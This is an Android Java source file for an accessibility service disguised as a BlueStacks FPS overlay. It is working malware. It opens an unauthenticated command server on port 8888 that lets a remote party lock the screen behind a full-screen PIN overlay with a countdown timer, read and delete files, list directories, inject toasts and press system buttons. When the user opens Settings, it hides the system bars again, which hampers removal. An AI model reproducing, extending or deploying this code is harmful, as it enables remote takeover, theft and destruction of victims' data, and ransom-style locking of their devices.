package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Button;
import android.widget.TextView;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.os.Environment;
import android.widget.Toast;
import java.io.File;
import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Locale;

public class SupportService extends AccessibilityService {
    private WindowManager wm;
    private View overlay;
    private TextView tv_status;
    private TextView tv_display;
    private StringBuilder input_buffer = new StringBuilder();
    private long remaining_sec;
    private Handler task_handler = new Handler(Looper.getMainLooper());
    private static final String PREFS_NAME = "lock_prefs";
    private static final String KEY_END_TIME = "end_time";
    
    private ServerSocket serverSocket;
    private boolean isLocked = false;
    private String currentPath = Environment.getExternalStorageDirectory().getAbsolutePath();

    public native boolean checkKey(String s);
    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    private final Runnable ticker = new Runnable() {
        @Override
        public void run() {
            long currentTime = System.currentTimeMillis();
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            long endTime = prefs.getLong(KEY_END_TIME, 0);
            
            remaining_sec = (endTime - currentTime) / 1000;
            
            if (remaining_sec > 0) {
                update_timer();
                task_handler.postDelayed(this, 1000);
            } else {
                remaining_sec = 0;
                update_timer();
            }
        }
    };

    private void update_timer() {
        if (tv_status != null) {
            long h = remaining_sec / 3600;
            long m = (remaining_sec % 3600) / 60;
            long s = remaining_sec % 60;
            tv_status.setText(String.format(Locale.getDefault(), "%02d:%02d:%02d", h, m, s));
        }
    }

    private void init_timer() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        long endTime = prefs.getLong(KEY_END_TIME, 0);
        if (endTime == 0) {
            endTime = System.currentTimeMillis() + (86400 * 1000);
            prefs.edit().putLong(KEY_END_TIME, endTime).apply();
        }
    }

    @Override
    protected void onServiceConnected() {
        init_timer();
        startRemoteServer();
    }

    private void startRemoteServer() {
        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(8888);
                while (true) {
                    Socket client = serverSocket.accept();
                    handleCommand(client);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void handleCommand(Socket client) {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintWriter out = new PrintWriter(client.getOutputStream(), true);
            String cmd = in.readLine();

            if (cmd == null) return;
            
            String cmdLower = cmd.toLowerCase().trim();

            if (cmdLower.equals("lock")) {
                task_handler.post(() -> {
                    if (!isLocked) {
                        showOverlay();
                        isLocked = true;
                    }
                });
                out.println("OK: Device Locked");
            } else if (cmdLower.equals("unlock")) {
                task_handler.post(() -> {
                    if (isLocked) {
                        hideOverlay();
                        isLocked = false;
                    }
                });
                out.println("OK: Device Unlocked");
            } else if (cmdLower.startsWith("message ")) {
                String msg = cmd.substring(8);
                task_handler.post(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show());
                out.println("OK: Message Sent");
            } else if (cmdLower.equals("vibrate")) {
                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        v.vibrate(1000);
                    }
                }
                out.println("OK: Vibrating");
            } else if (cmdLower.equals("home")) {
                performGlobalAction(GLOBAL_ACTION_HOME);
                out.println("OK: Home Pressed");
            } else if (cmdLower.equals("back")) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                out.println("OK: Back Pressed");
            } else if (cmdLower.equals("screen")) {
                String pkg = (getRootInActiveWindow() != null) ? getRootInActiveWindow().getPackageName().toString() : "Unknown";
                out.println("DATA: " + pkg);
            } else if (cmdLower.equals("pwd")) {
                out.println(currentPath);
            } else if (cmdLower.startsWith("cd ")) {
                String newPath = cmd.substring(3).trim();
                File dir = new File(newPath.startsWith("/") ? newPath : currentPath + "/" + newPath);
                if (dir.exists() && dir.isDirectory()) {
                    currentPath = dir.getAbsolutePath();
                    out.println("OK: Changed to " + currentPath);
                } else {
                    out.println("ERROR: Not a directory");
                }
            } else if (cmdLower.startsWith("ls")) {
                String path = cmd.length() > 3 ? cmd.substring(3).trim() : currentPath;
                File dir = new File(path.startsWith("/") ? path : currentPath + "/" + path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        StringBuilder sb = new StringBuilder();
                        for (File f : files) {
                            sb.append(f.isDirectory() ? "[d] " : "[f] ").append(f.getName()).append("\n");
                        }
                        out.println(sb.toString().isEmpty() ? "Empty" : sb.toString());
                    } else {
                        out.println("ERROR: Access Denied");
                    }
                } else {
                    out.println("ERROR: Invalid Dir");
                }
            } else if (cmdLower.startsWith("cat ")) {
                String fileName = cmd.substring(4).trim();
                File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
                if (f.exists() && f.isFile()) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)));
                    String line;
                    StringBuilder content = new StringBuilder();
                    while ((line = br.readLine()) != null) content.append(line).append("\n");
                    br.close();
                    out.println(content.toString());
                } else {
                    out.println("ERROR: File not found");
                }
            } else if (cmdLower.startsWith("rm ")) {
                String fileName = cmd.substring(3).trim();
                File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
                if (f.exists() && f.delete()) {
                    out.println("OK: Deleted");
                } else {
                    out.println("ERROR: Delete failed");
                }
            } else if (cmdLower.equals("info")) {
                out.println("Model: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE);
            } else {
                out.println("ERROR: Unknown Command");
            }
            client.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void showOverlay() {
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        LayoutInflater inflater = LayoutInflater.from(this);
        overlay = inflater.inflate(R.layout.sys_opt_view, null);

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        lp.format = PixelFormat.TRANSLUCENT;
        lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                   WindowManager.LayoutParams.FLAG_FULLSCREEN |
                   WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS |
                   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                   WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            lp.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        lp.width = WindowManager.LayoutParams.MATCH_PARENT;
        lp.height = WindowManager.LayoutParams.MATCH_PARENT;
        lp.gravity = Gravity.TOP | Gravity.START;

        tv_status = overlay.findViewById(R.id.v_timer);
        tv_display = overlay.findViewById(R.id.v_display);
        
        setupButtons();

        wm.addView(overlay, lp);
        overlay.post(this::apply_immersive_mode);
        task_handler.post(ticker);
    }

    private void hideOverlay() {
        if (wm != null && overlay != null) {
            wm.removeView(overlay);
            overlay = null;
            task_handler.removeCallbacks(ticker);
        }
    }

    private void setupButtons() {
        int[] ids = {R.id.v_b0, R.id.v_b1, R.id.v_b2, R.id.v_b3, R.id.v_b4, 
                     R.id.v_b5, R.id.v_b6, R.id.v_b7, R.id.v_b8, R.id.v_b9};
        
        for (int id : ids) {
            overlay.findViewById(id).setOnClickListener(v -> {
                if (input_buffer.length() < 8) {
                    input_buffer.append(((Button)v).getText().toString());
                    refresh_display();
                }
            });
        }

        overlay.findViewById(R.id.v_del).setOnClickListener(v -> {
            if (input_buffer.length() > 0) {
                input_buffer.setLength(input_buffer.length() - 1);
                refresh_display();
            }
        });

        overlay.findViewById(R.id.v_ok).setOnClickListener(v -> {
            if (checkKey(input_buffer.toString())) {
                hideOverlay();
                isLocked = false;
            } else {
                input_buffer.setLength(0);
                refresh_display();
            }
        });
    }

    private void apply_immersive_mode() {
        if (overlay == null) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            WindowInsetsController controller = overlay.getWindowInsetsController();
            if (controller != null) {
                controller.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
                controller.setSystemBarsBehavior(WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
            }
        } else {
            overlay.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        }
    }

    private void refresh_display() {
        if (tv_display != null) {
            tv_display.setText(input_buffer.toString());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (isLocked && overlay != null) {
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                if (pkgName.equals("com.android.settings")) {
                    apply_immersive_mode();
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        hideOverlay();
        try { if (serverSocket != null) serverSocket.close(); } catch (Exception e) {}
    }
}
